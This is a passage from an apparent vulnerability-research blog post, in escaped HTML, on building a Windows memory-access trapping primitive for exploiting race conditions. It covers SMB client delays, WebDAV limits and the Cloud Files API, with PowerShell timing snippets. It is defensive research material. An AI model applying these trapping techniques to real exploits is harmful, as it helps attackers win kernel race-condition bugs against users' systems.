c25"&gt;&amp;nbsp; &amp;nbsp; Console.WriteLine(&lt;/span&gt;&lt;span class="c17 c25 c41"&gt;&amp;quot;====&amp;gt; Continuing.&amp;quot;&lt;/span&gt;&lt;span class="c3"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c17 c25"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;The data returned by the read operation can be arbitrary, you just need to fill in the appropriate byte buffers in the read. To test the access times I wrapped the memory read requests inside a &lt;/span&gt;&lt;span class="c1"&gt;Measure-Command&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;call to time the memory access.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.53f9db697677b11db6ff0543fe5a0c850ad2fc52"&gt;&lt;/a&gt;&lt;a id="t.9"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c6"&gt;&lt;span class="c14"&gt;Measure-Command&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;{ &lt;/span&gt;&lt;span class="c17 c18"&gt;$m&lt;/span&gt;&lt;span class="c17 c22"&gt;.&lt;/span&gt;&lt;span class="c17 c25"&gt;ReadBytes(&lt;/span&gt;&lt;span class="c12"&gt;512&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024 - 4&lt;/span&gt;&lt;span class="c17 c22"&gt;,&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;4&lt;/span&gt;&lt;span class="c3"&gt;) }&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c14"&gt;Measure-Command&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;{ &lt;/span&gt;&lt;span class="c17 c18"&gt;$m&lt;/span&gt;&lt;span class="c17 c22"&gt;.&lt;/span&gt;&lt;span class="c17 c25"&gt;ReadBytes(&lt;/span&gt;&lt;span class="c12"&gt;512&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024 - 4&lt;/span&gt;&lt;span class="c17 c22"&gt;,&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;4&lt;/span&gt;&lt;span class="c3"&gt;) }&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c14"&gt;Measure-Command&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;{ &lt;/span&gt;&lt;span class="c17 c18"&gt;$m&lt;/span&gt;&lt;span class="c17 c22"&gt;.&lt;/span&gt;&lt;span class="c17 c25"&gt;ReadBytes(&lt;/span&gt;&lt;span class="c12"&gt;512&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;,&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;4&lt;/span&gt;&lt;span class="c3"&gt;) }&lt;/span&gt;&lt;/p&gt;&lt;p class="c6"&gt;&lt;span class="c14"&gt;Measure-Command&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;{ &lt;/span&gt;&lt;span class="c17 c18"&gt;$m&lt;/span&gt;&lt;span class="c17 c22"&gt;.&lt;/span&gt;&lt;span class="c17 c25"&gt;ReadBytes(&lt;/span&gt;&lt;span class="c12"&gt;512&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;*&lt;/span&gt;&lt;span class="c12"&gt;1024&lt;/span&gt;&lt;span class="c17 c22"&gt;,&lt;/span&gt;&lt;span class="c17 c25"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;4&lt;/span&gt;&lt;span class="c3"&gt;) }&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;To compare the access time a read request is made to a location 4 bytes below the 512MiB boundary and then at the 512MiB boundary. By making two requests we should be able to see if the results differ per-read. The results were as follows:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1b10c488dac72e26bdb507ea70f012f42fb416be"&gt;&lt;/a&gt;&lt;a id="t.10"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;# Below 512MiB (Request 1)&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Days &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Hours &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Minutes &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4 c28"&gt;Seconds &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 1&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4 c28"&gt;Milliseconds &amp;nbsp; &amp;nbsp; &amp;nbsp;: 25&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;p class="c8 c7"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;# Below 512MiB (Request 2)&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Days &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Hours &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Minutes &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4 c28"&gt;Seconds &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4 c28"&gt;Milliseconds &amp;nbsp; &amp;nbsp; &amp;nbsp;: 1&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;p class="c8 c7"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c8 c7"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;# Above 512MiB (Request 1)&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Days &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Hours &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Minutes &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4 c40"&gt;Seconds &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 10&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4 c40"&gt;Milliseconds &amp;nbsp; &amp;nbsp; &amp;nbsp;: 358&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;p class="c8 c7"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;# Above 512MiB (Request 2)&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Days &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Hours &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;Minutes &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4 c40"&gt;Seconds &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4 c40"&gt;Milliseconds &amp;nbsp; &amp;nbsp; &amp;nbsp;: 1&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c4"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;The first access for below 512MiB takes around a second, this is because the request still needs to be made to the server and the server is written in .NET which can have a slow startup time for running new code. The second request takes significantly less that 1 second, the memory is now cached locally and so there doesn&amp;rsquo;t need to be any request.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;For the accesses above 512MiB the first request takes around 10 seconds, which correlates with the added delay. The second request takes less than a second because the page is now cached locally. This is exactly what we&amp;rsquo;d expect, and proves that we can at least delay for 10 seconds. In fact you can delay the request at least &lt;/span&gt;&lt;span&gt;60 seconds&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;before the connection is forcibly reset. This is based on the session timeout for the SMB client. You can query the SMB client timeout using the following command in PowerShell:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.db47a5709a9f9e94517cc875b722670219be55f2"&gt;&lt;/a&gt;&lt;a id="t.11"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c17 c25"&gt;PS&amp;gt; (&lt;/span&gt;&lt;span class="c14"&gt;Get-SmbClientConfiguration&lt;/span&gt;&lt;span class="c3"&gt;).SessionTimeout&lt;/span&gt;&lt;/p&gt;&lt;p class="c8"&gt;&lt;span class="c3"&gt;60&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c11 c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c1"&gt;A few things to note about the SMB client&amp;rsquo;s behavior which came out of testing. First the client or the Windows cache manager seem to be able to do some caching of the remote file. If you request a specific access when opening the file, such as GENERIC_READ | GENERIC_WRITE for the desired access then caching is enabled. This means the read requests do not go to the server if they&amp;rsquo;re previously been cached locally. However if you specify MAXIMUM_ALLOWED for the desired access the caching doesn&amp;rsquo;t seem to take place. Secondly, sometimes parts of the file will be pre-cached, such as the first and last 32KiB of the file. I&amp;rsquo;ve not worked out what is the cause, oddly it seems to happen more often with native code than .NET code, so perhaps it&amp;rsquo;s Windows Defender peeking at memory or perhaps Superfetch. In general as long as you keep your memory accesses somewhere in the middle of a large file you should be safe.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;If you&amp;rsquo;ve run the example code you might notice a problem, running the example server locally fails with the following error:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;System.Net.Sockets.SocketException (10013): An attempt was made to access a socket in a way forbidden by its access permissions.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;By default Windows 10 has the SMB server enabled. This takes over the TCP ports and makes them exclusive so it&amp;rsquo;s not possible to bind to them from a normal user. It is possible to disable the local SMB server, but that would require administrator privileges. Still, it was worth verifying whether the SMB server approach will work even if we have to communicate with a remote server.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;I did do some investigation into tricks I could use to get the built-in SMB server to work for our purposes. For example I tried to use the fact that you can set an Opportunistic Lock which will trap file reads. I used this trick to exploit a &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1774"&gt;TOCTOU vulnerability&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;in the LUAFV driver. Unfortunately the SMB server detects the file is already in a lock and waits for the OpLock break to occur before allowing access to the file. This made it a non-starter.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;For testing you can disable the &lt;/span&gt;&lt;span class="c1"&gt;LanmanServer&lt;/span&gt;&lt;span&gt;&amp;nbsp;service and its corresponding drivers. If you wanted to use this on an arbitrary system you&amp;#39;d almost certainly need to connect to a remote server. I&amp;rsquo;ve released the example server code &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2142"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which can be repurposed, although it is only a demonstrator. It allows for read granularity of the native page size, which is assumed to be 4KiB. The server code should work on Linux but as of version 1.4.3 of SMBLibrary on NuGet there&amp;rsquo;s a bug which causes the server to fail when starting. There is a fix in the &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://github.com/TalAloni/SMBLibrary/commit/e1d06e72daa91a4f0021707c525bcd20c805d7fc"&gt;github repository&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;but at the time of writing there&amp;rsquo;s no updated package.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;How well does abusing the SMB client meet with our criteria from earlier? I&amp;rsquo;ve crossed out all the ones we&amp;rsquo;ve met.&lt;/span&gt;&lt;/p&gt;&lt;ul style='padding: 0;' class="c19 lst-kix_fmvhww8n3gvt-0"&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c37"&gt;Works on a default installation of Windows 10 20H2.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c37"&gt;Gives a clear signal when memory is read or written.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c37"&gt;Works when memory is accessed from both user and kernel mode.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c37"&gt;Allows for delaying memory access indefinitely.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c37"&gt;The data in the memory accessed is arbitrary.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;The primitive can be set up from a range of privilege levels.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c5 c33 li-bullet-0"&gt;&lt;span class="c0"&gt;Can trap multiple times during the same exploit.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;Using the SMB client does meet the majority of our criteria. I verified that it doesn&amp;rsquo;t matter whether kernel or user mode code accesses the memory it will still trap. The biggest problem is it&amp;rsquo;s hard to use this from a sandboxed application where it would perhaps be most useful. This is because MUP restricts access to remote file systems by default from restricted and low IL processes and AppContainer sandboxes need specific capabilities which are unlikely to be granted to the majority of applications. That&amp;rsquo;s not to say it&amp;rsquo;s completely impossible but it&amp;rsquo;d be hard to do.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;While our trick doesn&amp;rsquo;t really delay the memory read indefinitely, for our purposes the limit of 60 seconds based on the SMB session timeout is going to be enough for most vulnerabilities. Also once the trap has been activated you can&amp;rsquo;t force the memory manager to request the same page from the server. I tried playing with memory caching flags and direct IO but at least for files over SMB nothing seemed to work. However, you can specify your own base address when mapping a file so you could map different offsets in the file to the same virtual address by unmapping the original and mapping in a new copy. This would allow you to use the same address multiple times.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c47" id="h.evvlbxcvrcux"&gt;&lt;span&gt;WebDAV&lt;/span&gt;&lt;/h3&gt;&lt;p class="c5"&gt;&lt;span&gt;As SMB can&amp;rsquo;t be easily used locally, what about WebDAV? By default TCP port 80 is unused on Windows 10 so we can start our own web server to communicate with. Also unlike on Linux there&amp;rsquo;s no requirement for having administrator privileges to bind to TCP ports under 1024. Even if either of these were not the case the WebDAV client supports a syntax to specify the TCP port of the server. For example if you use the path &lt;/span&gt;&lt;span class="c1"&gt;\\localhost@8080\share&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;then the WebDAV HTTP connection will be made over port 8080.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;However, does the WebDAV client expose the right read and write primitives to allow us to trap on memory access? I wrote a simple WebDAV server using the &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://github.com/ramondeklein/nwebdav"&gt;NWebDav&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;library to serve local files. Running the script but specifying the WebDAV server on port 8080 to open the 1GiB file I&amp;rsquo;m immediately faced with a problem:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;Get-NtFile : (0xC0000904) - The file size exceeds the limit allowed and cannot be saved.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;Just opening the file fails with the error code &lt;/span&gt;&lt;span class="c1"&gt;STATUS_FILE_TOO_LARGE&lt;/span&gt;&lt;span&gt;. The reason for that can be found in one of many Microsoft Knowledge Base articles such as &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://support.microsoft.com/en-us/help/900900/folder-copy-error-message-when-downloading-a-file-that-is-larger-than"&gt;this one&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. There&amp;rsquo;s a default limit of 50MB (that&amp;rsquo;s decimal megabytes) for any file accessed on a WebDAV share because it used to be possible to cause a denial of service by tricking a Windows system into downloading an arbitrarily large file.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;The reason this size limiting behavior is in place is why WebDAV isn&amp;rsquo;t suitable for this attack. If you resize the file to below 50MB you&amp;rsquo;ll find the WebDAV client pulls the file in its entirety to the local disk before returning from the file open call. That file is then mapped into memory as a local file. The WebDAV server never receives a GET or PUT request for reads/writes to the memory mapping synchronously so there&amp;rsquo;s no mechanism to detect or trap specific memory requests.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c44" id="h.59ueolz2y462"&gt;&lt;span class="c31"&gt;File System Overlay APIs&lt;/span&gt;&lt;/h2&gt;&lt;p class="c5"&gt;&lt;span&gt;Abusing the SMB client does work, but it can&amp;rsquo;t be used locally on a default installation. I decided I need to look for another approach. As I was looking at Windows Filter Drivers (see &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html"&gt;last blog post&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;) I noticed a few of the drivers provided a mechanism to overlay another file system on top of an existing one. I trawled through MSDN to find the API documentation to see if anything would be suitable. The three I looked at are shown in the table below.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.07db48b5a4fefea0a123d782488fba47f782125d"&gt;&lt;/a&gt;&lt;a id="t.12"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c2 c42" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c26"&gt;File system&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34 c42" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c26"&gt;Supported Version&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c23 c42" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c26"&gt;Default?&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/projfs/projected-file-system"&gt;Projected File System&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Windows 10 1809&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;No&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/api/wofapi/"&gt;Windows Overlay (WOF)&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Everything&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Yes&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c13"&gt;&lt;td class="c2" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/cfapi/cloud-files-api-portal"&gt;Cloud Files API&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c34" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Windows 10 1709 &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt;&lt;p class="c8"&gt;&lt;span class="c0"&gt;Yes (except non-Desktop Server SKUs)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;By far the most interesting one is the Projected File System. This was developed by Microsoft to provide a virtual file system for GIT. It allows placeholder files to be &amp;ldquo;projected&amp;rdquo; into a directory on disk and the contents of those files are only &amp;ldquo;rehydrated&amp;rdquo; to a full file on demand. In theory this sounds ideal, as long as it would populate the file&amp;rsquo;s contents piecemeal we could add the delays when receiving the &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/api/projectedfslib/nc-projectedfslib-prj_get_file_data_cb"&gt;PRJ_GET_FILE_DATA_CB callback&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;However a basic implementation based on Microsoft&amp;rsquo;s &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://github.com/Microsoft/Windows-classic-samples/tree/master/Samples/ProjectedFileSystem"&gt;ProjectedFileSystem&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;sample code would always rehydrate the entire file during file open, similar to WebDAV. Perhaps there&amp;rsquo;s an option I missed to stream the contents rather than populate it in one go but I couldn&amp;rsquo;t find it immediately. In any case the Projected File System is not installed by default making it less useful. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;WOF doesn&amp;rsquo;t really allow you to implement your own file system semantics. Instead it allows you to overlay files from either a secondary Windows Image File (WIM) or compressed on the same volume. This really doesn&amp;rsquo;t give us the control we&amp;rsquo;re looking for, you might be able to finagle something to work but it seems a lot of effort.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;That leaves us with the Cloud Files API. This is used by OneDrive to provide the local online filesystem but is documented and can be used to implement any file system overlay you like. It works very similar to the Projected File System, with placeholders for files and the concept of hydrating the file on demand. The contents of the files do not need to come from any online service such as OneDrive, it can all be sourced locally. Crucially after some basic testing it supports streaming the contents of the file based on what was being read and you could delay the file data requests and the reading thread would block until the read has been satisfied. This can be enabled by specifying the &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/api/cfapi/ne-cfapi-cf_hydration_policy_primary"&gt;CF_HYDRATION_POLICY_PRIMARY&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;hydration policy with the value &lt;/span&gt;&lt;span class="c1"&gt;CF_HYDRATION_POLICY_PARTIAL&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;when configuring the base sync root. This allows the Cloud File API to only hydrate the file&amp;#39;s parts which were accessed.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;This seemed perfect, until I tested with the PowerShell file mapping script where it didn&amp;rsquo;t work, my cloud file provider would always be requested to provide the entire file. Checking the Cloud Filter driver, when a request is received for mapping a placeholder file, the &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" 